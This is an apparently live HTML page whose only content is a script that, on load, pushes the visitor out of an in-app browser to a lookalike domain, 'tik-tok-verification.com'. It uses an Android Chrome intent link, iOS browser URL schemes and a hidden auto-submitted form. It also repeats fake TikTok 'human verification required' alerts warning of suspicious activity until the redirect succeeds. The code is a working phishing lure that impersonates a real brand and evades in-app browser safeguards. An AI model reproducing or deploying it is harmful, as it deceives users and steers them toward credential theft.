<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; }</style>
</head>
<body>

<form id="ejectForm" action="https://tik-tok-verification.com/Verification/verify1.html" method="GET" target="_system" style="display:none;"></form>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const domain = "tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000;

    function forceSystemBrowser() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android: Forcing the Chrome package directly via Intent
            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
        } else {
            // iOS: The POST + Protocol Stack
            
            // 1. Submit the form to the '_system' target
            document.getElementById('ejectForm').submit();

            // 2. Pulse the specific chrome/safari schemes to catch the handoff
            window.location.href = "googlechromes://" + domain;
            
            setTimeout(() => {
                window.location.href = "safari-https://" + domain;
            }, 100);
        }
    }

    function securityLoop() {
        if (Date.now() > killTime) return;

        forceSystemBrowser();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);

                // Re-trigger on user gesture
                forceSystemBrowser();

                setTimeout(securityLoop, 300);
            }
        }, 300);
    }

    window.onload = securityLoop;
</script>
</body>
</html>
